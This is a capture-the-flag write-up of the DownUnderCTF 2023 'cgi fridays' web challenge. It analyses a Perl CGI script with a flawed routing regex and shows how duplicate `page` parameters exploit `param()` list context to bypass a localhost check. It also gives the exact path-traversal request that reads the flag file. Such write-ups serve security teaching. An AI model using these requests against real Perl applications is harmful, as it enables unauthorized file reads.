# cgi fridays

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- Solved by: @Foo
- Contributor: @siunam
- 116 solves / 164 points
- Author: hashkitten
- Overall difficulty for me (From 1-10 stars): ★★★★★☆☆☆☆☆

## Background

1999 called, and they want their challenge back.

Author: hashkitten

[https://web-cgi-fridays-de834c0607c7.2023.ductf.dev](https://web-cgi-fridays-de834c0607c7.2023.ductf.dev)

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2023/images/Pasted%20image%2020230903212421.png)

## Enumeration

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2023/images/Pasted%20image%2020230903212443.png)

In here, we can view a few of the web server's information, like it's kernel version, CPU info, etc:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2023/images/Pasted%20image%2020230903213014.png)

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2023/web/cgi-fridays/cgi-fridays.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2023/web/cgi-fridays)-[2023.09.03|21:31:02(HKT)]
└> file cgi-fridays.zip            
cgi-fridays.zip: Zip archive data, at least v2.0 to extract, compression method=store
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2023/web/cgi-fridays)-[2023.09.03|21:31:06(HKT)]
└> unzip cgi-fridays.zip 
Archive:  cgi-fridays.zip
   creating: src/cgi-bin/
  inflating: src/cgi-bin/route.pl    
  inflating: src/Dockerfile          
 extracting: src/flag.txt            
   creating: src/htdocs/
  inflating: src/htdocs/.htaccess    
  inflating: src/htdocs/index.shtml  
   creating: src/htdocs/pages/
  inflating: src/htdocs/pages/about.txt  
 extracting: src/htdocs/pages/denied.txt  
 extracting: src/htdocs/pages/home.txt  
```

**In `src/htdocs/index.shtml`, we can see that it uses Server-Side Include (SSI) to include the `/cgi-bin/route.pl` Perl script:**
```html
  <div class="content">
    <div class="status ok">
      <pre><!--#include virtual="/cgi-bin/route.pl?$QUERY_STRING" --></pre>
    </div>
  </div>
```

**Let's dig through that Perl script!**
```perl
#!/usr/bin/env perl

use strict;
use warnings;
use CGI::Minimal;

use constant HTDOCS => '/usr/local/apache2/htdocs';

sub read_file {
    my ($file_path) = @_;
    my $fh;

    local $/;
    open($fh, "<", $file_path) or return "read_file error: $!";
    my $content = <$fh>;
    close($fh);

    return $content;
}

sub route_request {
    my ($page, $remote_addr) = @_;

    if ($page =~ /^about$/) {
        return HTDOCS . '/pages/about.txt';
    }

    if ($page =~ /^version$/) {
        return '/proc/version';
    }

    if ($page =~ /^cpuinfo$/) {
        return HTDOCS . '/pages/denied.txt' unless $remote_addr eq '127.0.0.1';
        return '/proc/cpuinfo';
    }

    if ($page =~ /^stat|io|maps$/) {
        return HTDOCS . '/pages/denied.txt' unless $remote_addr eq '127.0.0.1';
        return "/proc/self/$page";
    }

    return HTDOCS . '/pages/home.txt';
}

sub escape_html {
    my ($text) = @_;

    $text =~ s/</&lt;/g;
    $text =~ s/>/&gt;/g;

    return $text;
}

my $q = CGI::Minimal->new;

print "Content-Type: text/html\r\n\r\n";

my $file_path = route_request($q->param('page'), $ENV{'REMOTE_ADDR'});
my $file_content = read_file($file_path);

print escape_html($file_content);
```

In here, when GET parameter `page` is given, it'll read the file content base on the file path:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2023/images/Pasted%20image%2020230903224106.png)

Hmm... It seems like if we can view `stat`, `io`, or `maps` page, we can leverage the **path traversal vulnerability**.

But, how to bypass the `127.0.0.1` client IP?

After trying bunch of headers like `X-Forwarded-Host`, I can't bypass it.

## Exploitation

According to [the PDF from Black Hat Asia 2016](https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf) that found by one of my teammates, it seems like ***Perl's `param()` has a fatal flaw.***

If you read the PDF a little bit, it basically says **`param()` may return a scalar or a list.**

**That being said, if we provide 2 `page` GET parameters:**
```
/cgi-bin/route.pl?page=version&page=about
```

**It'll return a list like this:**
```perl
("version", "about")
```

**That being said, we should be able to bypass the `127.0.0.1`!**
```http
GET /cgi-bin/route.pl?page=io&page=127.0.0.1 HTTP/2
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2023/images/Pasted%20image%2020230904201207.png)

Nice!!

Then, we can now **leverage path traversal to read the flag file**!!

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2023/images/Pasted%20image%2020230904203033.png)

Oh crap... We have to match the regular expression pattern to get the flag, and **the directory must exist...**

Hmm... Let's **find a directory that contains `stat`, `io`, or `maps`.**

**To do so, I'll use `find` command in Linux:**
```shell
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2023/web/cgi-fridays)-[2023.09.04|21:52:14(HKT)]
└> find / -type d -regex '.*/\(stat\|io\|maps\).*' 2>/dev/null
[...]
/sys/class/iommu
[...]
```

**Let's try that directory!**
```http
GET /cgi-bin/route.pl?page=../../sys/class/iommu/../../../flag.txt&page=127.0.0.1 HTTP/2
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2023/images/Pasted%20image%2020230904215517.png)

Nice! It worked!

- **Flag: `DUCTF{s qqjust another perl hacker q and print ucfirst}`**

## Conclusion

What we've learned:

1. Exploiting Perl's `param()` flaw